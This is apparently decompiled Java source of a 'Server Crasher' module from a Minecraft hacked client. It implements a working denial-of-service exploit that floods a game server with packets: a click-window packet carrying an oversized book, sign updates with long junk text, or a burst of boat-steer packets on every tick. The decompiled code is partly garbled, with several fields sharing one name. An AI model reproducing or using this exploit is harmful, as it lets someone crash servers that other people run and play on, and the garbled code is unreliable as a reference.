package com.backdoored.hacks.exploit;

import com.backdoored.hacks.*;
import a.a.g.b.*;
import com.backdoored.gui.*;
import net.minecraft.item.*;
import net.minecraft.util.text.*;
import a.a.g.b.d.*;
import com.backdoored.setting.*;
import com.backdoored.utils.*;
import net.minecraft.init.*;
import net.minecraft.nbt.*;
import net.minecraftforge.fml.common.gameevent.*;
import net.minecraft.inventory.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;
import net.minecraftforge.fml.common.eventhandler.*;

@b.a(name = "Server Crasher", description = "Methods of crashing servers", category = CategoriesInit.EXPLOIT)
public class ServerCrasher extends BaseHack
{
    private ItemStack itemStack;
    private String ps;
    private String pt;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent iTextComponent;
    private ITextComponent[] iTextComponent;
    private Setting<o.a> mode;
    
    public ServerCrasher() {
        super();
        this.itemStack = null;
        this.ps = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        this.pt = "red";
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.ps + "\",\"color\":\"" + this.pt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.ps + "\",\"color\":\"" + this.pt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.ps + "\",\"color\":\"" + this.pt + "\"}");
        this.iTextComponent = ITextComponent.Serializer.jsonToComponent("{\"text\":\"" + this.ps + "\",\"color\":\"" + this.pt + "\"}");
        this.iTextComponent = new ITextComponent[] { this.iTextComponent, this.iTextComponent, this.iTextComponent, this.iTextComponent };
        this.mode = new EnumSetting<o.a>("Mode", (BaseHack)this, (Enum)o.a.po);
    }
    
    public void onEnabled() {
        Utils.printMessage("Crashing", "red");
        if (this.mode.getValInt() == o.a.po) {
            this.itemStack = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tagCompound = new NBTTagCompound();
            final String username = ServerCrasher.mc.getSession().getUsername();
            final String ps = this.ps;
            for (int i = 0; i < 50; ++i) {
                list.appendTag((NBTBase)new NBTTagString(ps));
            }
            tagCompound.setString("author", username);
            tagCompound.setString("title", "\n Woops \n");
            tagCompound.setTag("pages", (NBTBase)list);
            this.itemStack.setTagInfo("pages", (NBTBase)list);
            this.itemStack.setTagCompound(tagCompound);
        }
    }
    
    @SubscribeEvent
    public void b(final TickEvent.ClientTickEvent clientTickEvent) {
        if (!this.getEnabled()) {
            return;
        }
        if (ServerCrasher.mc.world == null) {
            this.setEnabled(false);
            return;
        }
        try {
            if (this.mode.getValInt() == o.a.po) {
                ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, this.itemStack, (short)0));
            }
            if (this.mode.getValInt() == o.a.pp) {
                ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketUpdateSign(ServerCrasher.mc.player.getPosition(), this.iTextComponent));
            }
            if (this.mode.getValInt() == o.a.pq) {
                for (int i = 0; i < 100; ++i) {
                    ServerCrasher.mc.player.connection.sendPacket((Packet)new CPacketSteerBoat(true, true));
                }
            }
            Thread.sleep(12L);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
